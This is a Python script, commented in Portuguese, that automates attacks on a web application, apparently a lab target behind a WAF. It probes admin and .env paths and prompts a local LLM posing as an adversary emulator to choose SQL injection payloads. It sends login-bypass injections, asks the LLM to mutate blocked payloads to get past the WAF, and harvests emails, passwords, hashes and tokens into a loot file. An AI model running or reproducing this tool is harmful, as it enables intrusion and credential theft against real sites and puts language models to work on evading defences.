import requests
import json
import re
import os
import time
from ollama import Client

TARGET_BASE = "http://defense-waf:8080"
TARGET_URL = f"{TARGET_BASE}/rest/products/search"
LOOT_FILE = "loot.json"
client = Client(host="http://metatron_llm:11434")

# --- Matriz MITRE ATT&CK ---
MITRE_REFERENCE = {
    "Reconnaissance": {"T1595": "Active Scanning (Path Discovery)"},
    "Initial_Access": {"T1190": "Exploit Public-Facing Application (SQLi, XSS)"},
    "Defense_Evasion": {"T1562.001": "WAF Bypass", "T1027": "Obfuscation"},
    "Exfiltration": {"T1020": "Automated Exfiltration"}
}

def save_loot(data, source_ttp):
    loot_entry = {"timestamp": time.strftime("%Y-%m-%d %H:%M:%S"), "origin_ttp": source_ttp, "content": data}
    existing_loot = []
    if os.path.exists(LOOT_FILE):
        with open(LOOT_FILE, "r") as f:
            try: existing_loot = json.load(f)
            except: pass
    existing_loot.append(loot_entry)
    with open(LOOT_FILE, "w") as f:
        json.dump(existing_loot, f, indent=2)
    print(f"\n[#] LOOT CAPTURADO: {len(data)} artefatos salvos em {LOOT_FILE}")

def analyze_and_exfiltrate(res_json, ttp_context):
    sensitive_keys = ["email", "password", "hash", "token", "secret"]
    extracted = []
    
    def find_sensitive(obj):
        if isinstance(obj, dict):
            for k, v in obj.items():
                if any(key in k.lower() for key in sensitive_keys): extracted.append({k: v})
                find_sensitive(v)
        elif isinstance(obj, list):
            for item in obj: find_sensitive(item)
            
    find_sensitive(res_json)
    if extracted: 
        save_loot(extracted, ttp_context)
    else:
        print(f"    [-] Técnica {ttp_context} não retornou dados sensíveis (Loot vazio).")

def perform_discovery():
    print("[*] Fase 1: Executando T1595 (Path Discovery)...")
    paths = ["/admin", "/.env", "/config", "/rest/user/login"]
    discovered = []
    for p in paths:
        try:
            res = requests.head(f"{TARGET_BASE}{p}", timeout=2)
            if res.status_code in [200, 301, 403]: 
                discovered.append({"path": p, "status": res.status_code})
                print(f"    [+] Path Encontrado: {p} ({res.status_code})")
        except: continue
    return discovered

def mutate_payload(blocked_payload, tactic_context):
    print(f"\n[!] Bloqueio Detectado. Solicitando mutação para: {blocked_payload}")
    prompt = f"[TASK] Mutate payload '{blocked_payload}' for WAF bypass. Output ONLY the string."
    try:
        response = client.generate(model='qwen2.5-coder:1.5b', prompt=prompt, stream=False)
        return response['response'].strip().replace("`", "").split('\n')[0]
    except Exception as e:
        print(f"    [-] Falha na comunicação com LLM: {e}")
        return blocked_payload + "/**/" # Fallback manual

def execute_with_evasion(target, ttp, initial_payload, max_attempts=2):
    current_payload = initial_payload
    for attempt in range(max_attempts + 1):
        print(f"[*] Técnica {ttp['tid']} | Tentativa {attempt + 1}: {current_payload}")
        try:
            is_login = "login" in target.lower()
            if is_login:
                res = requests.post(target, json={"email": current_payload, "password": "v"}, timeout=5)
            else:
                res = requests.get(target, params={"q": current_payload}, timeout=5)

            if res.status_code == 200:
                return res
            elif res.status_code == 500:
                print(f"    [!] BYPASS DETECTADO, mas sintaxe SQL quebrou o backend.")
                if "--" in current_payload and not current_payload.endswith("-- "):
                    print("    [*] Aplicando Hardening de Sintaxe (terminador SQLite)...")
                    current_payload = current_payload.replace("--", "-- ")
                    # Tenta novamente com a sintaxe corrigida pelo script
                    continue
            elif res.status_code == 403:
                print(f"    [🛡️] Bloqueado (403).")
                if attempt < max_attempts:
                    current_payload = mutate_payload(current_payload, ttp['tid'])
            else:
                print(f"    [*] Status inesperado: {res.status_code}")
                break
        except Exception as e:
            print(f"    [-] Erro na requisição: {e}")
            break
    return None

def get_mitre_strategy(surface, paths):
    print("[*] Fase 2: Consultando Metatron Brain (LLM)...")
    # PROMPT HARDENING: Regras estritas de schema e proibição de comentários
    prompt = f"""
    [ROLE] Advanced Adversary Emulator.
    [TARGET] {json.dumps(surface)}
    [PATHS] {json.dumps(paths)}
    [MATRIX] {json.dumps(MITRE_REFERENCE)}
    
    [TASK] Select 3 Techniques from the MATRIX.
    [CONSTRAINT] OUTPUT ONLY VALID JSON ARRAY. NO COMMENTS (DO NOT USE //). NO PROSE.
    [SCHEMA] You MUST exactly match this JSON format:
    [
      {{"tactic": "Initial_Access", "tid": "T1190", "technique": "SQLi", "payload": "admin'--", "rationale": "targeting admin"}}
    ]
    """
    
    start_time = time.time()
    response = client.generate(model='qwen2.5-coder:1.5b', prompt=prompt, stream=False)
    print(f"[*] Brain respondeu em {time.time() - start_time:.2f}s")
    
    return response['response'].strip()

def run_ttp_emulation():
    # 1. Discovery
    paths = perform_discovery()
    try:
        r = requests.get(TARGET_BASE, timeout=5)
        surface = {"server": r.headers.get("Server"), "endpoint": TARGET_URL}
    except Exception as e:
        print(f"[-] Erro ao conectar no WAF: {e}")
        return

    # 2. Estratégia
    raw_strategy = get_mitre_strategy(surface, paths)
    print(f"[*] Raw Strategy da IA:\n{raw_strategy}") 

    try:
        match = re.search(r'\[.*\]', raw_strategy, re.DOTALL)
        if not match:
            print("[-] Erro: IA não retornou um array JSON válido.")
            return
            
        json_str = match.group(0)
        # Hardening defensivo: Remover comentários // que não sejam de URLs (http://)
        json_str = re.sub(r'(?<!:)//.*', '', json_str) 
        
        ttp_plan = json.loads(json_str)
        
        # Correção de chaves se a IA alucinar novamente
        for ttp in ttp_plan:
            if 'tid' not in ttp and 'matrixKey' in ttp: ttp['tid'] = ttp['matrixKey']
            if 'payload' not in ttp: ttp['payload'] = "' OR 1=1--" # Fallback
            
        print(f"\n[+] Plano de Ataque: {[t.get('tid', 'Unknown') for t in ttp_plan]}")
    except Exception as e:
        print(f"[-] Falha crítica no parse do plano: {e}")
        return

    # 3. Execução
    for ttp in ttp_plan:
        tid = ttp.get('tid', 'Unknown')
        print(f"\n--- Iniciando {tid} ---")
        target = f"{TARGET_BASE}/rest/user/login" if "login" in str(ttp).lower() else TARGET_URL
        result = execute_with_evasion(target, ttp, ttp.get('payload', ''))
        
        if result and result.status_code == 200:
            print(f"[!!!] SUCESSO. Extraindo loot...")
            analyze_and_exfiltrate(result.json(), tid)

if __name__ == "__main__":
    run_ttp_emulation()
